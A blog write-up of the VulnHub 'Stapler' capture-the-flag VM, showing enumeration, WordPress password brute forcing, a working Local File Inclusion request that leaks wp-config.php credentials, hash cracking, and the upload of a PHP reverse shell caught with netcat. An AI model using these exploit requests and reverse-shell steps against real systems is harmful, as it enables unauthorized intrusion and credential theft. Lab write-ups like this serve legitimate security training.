---
layout: post
title:  "Vulnhub: Stapler Writeup"
date:   2023-05-25
author: Tobashi
excerpt: This is a writeup for the boot to root VulnHub CTF Stapler.
categories: CTF
---

* ToC
{:toc}

This is a writeup for the VulnHub CTF virtual machine [Stapler](https://www.vulnhub.com/entry/stapler-1,150/), authored by VulnHub founder g0tmi1k.  
Stapler is a simple boot to root machine with multiple paths to root access.

# Enumeration
## Host Discovery
Find the local network IP and subnet of our machine to find the Stapler host machine.  
Enumerate the Stapler machine using the `nmap` network scanner. 
```
$ ip a

inet 10.0.2.4/24
```

```
$ nmap -sn 10.0.2.0/24

Nmap scan report for 10.0.2.1 // VirtualBox network adapter
Host is up (0.00076s latency).
Nmap scan report for 10.0.2.4 // our machine
Host is up (0.00062s latency).
Nmap scan report for 10.0.2.5 // Stapler host machine
Host is up (0.00045s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.94 seconds
```

## Host Enumeration
Scan all 65535 ports of Stapler to enumerate the available ports and their services:
```
$ nmap -p- 10.0.2.5

Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
```

Scan for more information regarding the available ports:
* -sC: Equivalent to --script=default / default script scan
* -sV: Probe open ports to determine service/version info

```
$ nmap -sC -sV -p- 10.0.2.5

PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8121cea11a05b1694f4ded8028e89905 (RSA)
|   256 5ba5bb67911a51c2d321dac0caf0db9e (ECDSA)
|_  256 6d01b773acb0936ffab989e6ae3cabd3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: FoundRows, LongPassword, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolNew, SupportsCompression, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: :7+SKI,(8\x1C\\x11]7  h?+\x7F\x01
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.93%I=7%D=5/18%Time=64660BEC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|_  start_date: N/A
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|_  FQDN: red
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 34m37s, median: 1h59m58s
```

There are a few interesting services available, possible websites on ports 80 and 12380, what looks like a file on port 666 and it looks like anonymous login is enabled on FTP.

# Foothold
To gain an initial foothold we check whether access to the Stapler machine can be gained from any of the available services.

## Port 21: ftp

We can connect to FTP and login as guest with the anonymous user with no password.
```
$ ftp 10.0.2.5

Connected to 10.0.2.5.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (10.0.2.5:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

When unfamiliar with a service, we can usually use the _help_ command to find the available commands.  
_ls_ is available to list the files in the current directory, which shows a file called note.  
_more_ is also available for reading the note.

```
$ ls

150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note

$ more note

Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

It does not look like we can do anymore from the guest login, but lets note the names Harry, Elly and John as possible usernames.

## Port 666: doom?

From our enumeration of port 666, it looks like it might respond with a file, message2.jpg.  
We can connect to port 666 using `netcat` and redirect the connection stream to a file to save the response.  
The stream contains the string message2.jpg but it is also accompanied by a lot of other data. 
We can use the _file_ command to get more information regarding the file type.
```
$ nc 10.0.2.5 666 > message
$ file message

message: Zip archive data, at least v2.0 to extract, compression method=deflate
```

The Zip archive can be extracted with `7z`, which reveals the image message2.jpg.  
The image mentions another name Scott and shows a segmentation fault resulting from an echo command, which could be a hint.  
There might be more to the image so we check whether there is anything hidden in the bytes of the image.  
We can use the _cat_ command to print the entire image, but the _strings_ command will print any sequences of printable characters.

```
$ 7z x message
$ strings message2.jpg

JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!
8BIM
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
/<}m
>,xr?
u-o[
Sxw]
v;]>
|_m7
l~!|0
<Elu
I[[k:>
>5[^k
;o{o
>xgH
mCXi
PE<R"
umcV
g[Y@=
[\Y_
\Oku
'X|(
?=?i
//Do
1okb
,>,&
n<;oc
*?      xC
~ |y
6{M6
```

It seems the image was created using Photoshop and it contains a short message, but it does not seem like this image contains anything useful.

## Port 80, 12380: http

The web service on port 80 does not appear interesting as it simply displays a not found error, telling us the requested resource was not found on this server.  
We can use `nikto -h 10.0.2.5` to scan the web service to see if there are any available paths or files, but the scan reveals nothing.  
Sometimes it is helpful to also scan the secure web service at `https://10.0.2.5` but there is no available web service there.

There is also a web service on port 12380, which appears to be a website under construction.  
The `nikto` scan on port 12380 does not reveal anything interesting, however the secure web service scan reveals a robots.txt file and some interesting paths:

```
$ nikto -h https://10.0.2.5:12380

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'dave' found, with contents: Soemthing doesn't look right here.
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/admin112233/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/blogblog/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Hostname '10.0.2.5' does not match certificate's names: Red.Initech. See: https://cwe.mitre.org/data/definitions/297.html
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /phpmyadmin/: phpMyAdmin directory found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8259 requests: 1 error(s) and 14 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Going to `https://10.0.2.5:12380/admin112233` reveals a dead end but contains a simple HTML page containing a pop-up referencing a category of injection attacks called <acronym title="Cross-Site Scripting">XSS</acronym>.

``` html
<html>
<head>
<title>mwwhahahah</title>
<body>
<noscript>Give yourself a cookie! Javascript didn't run =)</noscript>
<script type="text/javascript">window.alert("This could of been a BeEF-XSS hook ;)");window.location="http://www.xss-payloads.com/";</script>
</body>
</html>
```

Going to `https://10.0.2.5:12380/blogblog` reveals a WordPress blog with some posts by the user John and a login page.  
We can use the `wpscan` tool to enumerate available directories and users for the WordPress blog.
`wpscan` is also able to brute force the passwords for the usernames it finds.  
For brute forcing we can use the rockyou.txt password list.

```
$ wpscan --url https://10.0.2.5:12380/blogblog/ --disable-tls-checks --enumerate u -P /usr/share/wordlists/rockyou.txt

[+] URL: https://10.0.2.5:12380/blogblog/ [10.0.2.5]

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://10.0.2.5:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://10.0.2.5:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://10.0.2.5:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://10.0.2.5:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://10.0.2.5:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://10.0.2.5:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://10.0.2.5:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://10.0.2.5:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2023-03-24T00:00:00.000Z
 | Readme: https://10.0.2.5:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: https://10.0.2.5:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://10.0.2.5:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=====================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc Multicall against 11 user/s
[SUCCESS] - garry / football                                                                                       
[SUCCESS] - harry / monkey                                                                                         
[SUCCESS] - scott / cookie                                                                                         
[SUCCESS] - kathy / coolgirl
...
```
`wpscan` quickly finds the password for users garry, harry, scott and kathy, but it does not seem like these accounts have the capability to do anything interesting.  
They are also not valid logins for the phpMyAdmin page found during the `nikto` scan.

Brute forcing passwords can take a while when using a large list like rockyou.txt.
While `wpscan` is running, we can explore the directories found during the scan.

Going to `https://10.0.2.5:12380/blogblog/wp-content` reveals three folders: plugins, themes and uploads.  
Using the `searchsploit` tool we can check whether the plugins installed on the blog have any exploits that we can use.  
There is one result for the _advanced video embed_ plugin while the other plugins, shortcode ui and two factor have no results for the version installed.

```
$ searchsploit advanced video embed
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                       | php/webapps/39646.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 

The exploit Python script can be downloaded using `searchsploit` and executed after changing the target url to the WordPress blog.

```
$ searchsploit -m php/webapps/39646.py
$ python3 39646.py

urllib2.URLError: <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:733)>
```

If we look up this certification error, we find a simple work around on [StackOverflow](https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error) that bypasses the verification step.  
However, the Local File Inclusion exploit script is simple and contains a comment that shows how the exploit can be performed manually.  
The exploit makes a post publish request through admin-ajax.php with a thumb parameter that specifies the file to be included as ../wp-config.php.

```
# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

Request: https://10.0.2.5:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php

Response: https://10.0.2.5:12380/blogblog/?p=320
```

The response suggests a new post was created and if we look at the blog again, a new post has appeared.  
According to the exploit, the thumbnail for the newly published post now contains the file specified in the thumb parameter.
We can download the file with the _wget_ command, if we do not check the certificate validity.  
The file contains the configuration and connection details for the MySQL database that the WordPress blog uses.

```
$ wget --no-check-certificate https://10.0.2.5:12380/blogblog/wp-content/uploads/1012453615.jpeg

$ cat 1012453615.jpeg

<?php

/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

...

```

The username and password found in this file is a valid login for the phpMyAdmin page.  
From the phpMyAdmin page, we can extract the WordPress database containing its users and their hashed passwords.
We can use SQL to extract the users table and then export as a .csv file.

``` sql
SELECT user_login, user_pass FROM 'wp_users';
```

To crack the password hashes we use the `John the Ripper` tool, but it requires a specific input formatting.  
We can easily format the .csv file in `vim` and then run `John` to brute force the password hashes with the password list rockyou.txt.  
To change the .csv formatting we simply remove quotes and replace comma separation with colon separation.

```
$ vim wp_users.csv

:%s/"//g
:%s/,/:/g

$ john wp_users.csv --wordlist=/usr/share/wordlists/rockyou.txt

Loaded 16 password hashes with 16 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
cookie           (scott)
monkey           (harry)
football         (garry)
coolgirl         (kathy)
washere          (barry)
incorrect        (John)
thumb            (tim)
0520             (Pam)
passphrase       (heather)
damachine        (Dave)
```

We are quickly able to find additional passwords to the ones found during the `wpscan`.  
If we login with John's account, we see that his admin account has greater capabilities than the other accounts.
This account is able to upload new media and new plugins, so we might be able to upload a reverse shell.
A reverse shell would make the WordPress web service try to connect back to our machine and allow us to establish a connection to the back end server and gain a foothold.

If we look up php reverse shells there are a lot of simple php shells, however many either do not work or only work on specific systems.  
One of the first results is a php shell by [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).
We can download the reverse shell with _wget_, then upload it as a plugin to the blog with our ip and an arbitrary port.  
We can use `netcat` to setup of a listener that will receive the connecting reverse shell.  
When we access the uploaded reverse shell through the blog uploads directory, we gain a foothold as www-data on the Stapler machine running the WordPress blog.  

```
$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

$ nc -nlvp 12345

listening on [any] 12345 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.5] 38050
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# Privilege escalation
Now that we have a foothold, we can begin exploring any ways that make escalation to root access possible.  

We have access to a home folder, in which there are some available users. We can use _ls_ to check whether there is anything interesting in any of the user folders.

```
$ ls -alR home/

home:
total 128
drwxr-xr-x 32 root       root       4096 Jun  4  2016 .
drwxr-xr-x 22 root       root       4096 Jun  7  2016 ..
drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5  2016 AParnell
drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5  2016 CCeaser
drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5  2016 CJoo
drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5  2016 DSwanger
drwxr-xr-x  2 Drew       Drew       4096 Jun  5  2016 Drew
drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5  2016 ETollefson
drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5  2016 Eeth
drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5  2016 IChadwick
drwxr-xr-x  2 JBare      JBare      4096 Jun  5  2016 JBare
drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5  2016 JKanode
drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5  2016 JLipps
drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5  2016 LSolum
drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5  2016 LSolum2
drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5  2016 MBassin
drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5  2016 MFrei
drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5  2016 NATHAN
drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5  2016 RNunemaker
drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5  2016 SHAY
drwxr-xr-x  2 SHayslett  SHayslett  4096 Jun  5  2016 SHayslett
drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5  2016 SStroud
drwxr-xr-x  2 Sam        Sam        4096 Jun  5  2016 Sam
drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5  2016 Taylor
drwxr-xr-x  2 elly       elly       4096 Jun  5  2016 elly
drwxr-xr-x  2 jamie      jamie      4096 Jun  5  2016 jamie
drwxr-xr-x  2 jess       jess       4096 Jun  5  2016 jess
drwxr-xr-x  2 kai        kai        4096 Jun  5  2016 kai
drwxr-xr-x  2 mel        mel        4096 Jun  5  2016 mel
drwxr-xr-x  3 peter      peter      4096 Jun  3  2016 peter
drwxrwxrwx  2 www        www        4096 Jun  5  2016 www
drwxr-xr-x  2 zoe        zoe        4096 Jun  5  2016 zoe

home/AParnell:
total 24
drwxr-xr-x  2 AParnell AParnell 4096 Jun  5  2016 .
drwxr-xr-x 32 root     root     4096 Jun  4  2016 ..
-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
-rw-r--r--  1 AParnell AParnell  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 AParnell AParnell 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 AParnell AParnell  675 Sep  1  2015 .profile

home/CCeaser:
total 24
drwxr-xr-x  2 CCeaser CCeaser 4096 Jun  5  2016 .
drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
-rw-r--r--  1 CCeaser CCeaser  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 CCeaser CCeaser 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 CCeaser CCeaser  675 Sep  1  2015 .profile

...
```

It seems the bash command line history file is available for every user.  
We use _cat_ to print the history for all users to check for any interesting entries.

```
$ cat home/*/.bash_history

exit
free
exit
exit
exit
exit
exit
exit
exit
exit
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
exit
exit
exit
exit
whoami
exit
exit
exit
exit
exit
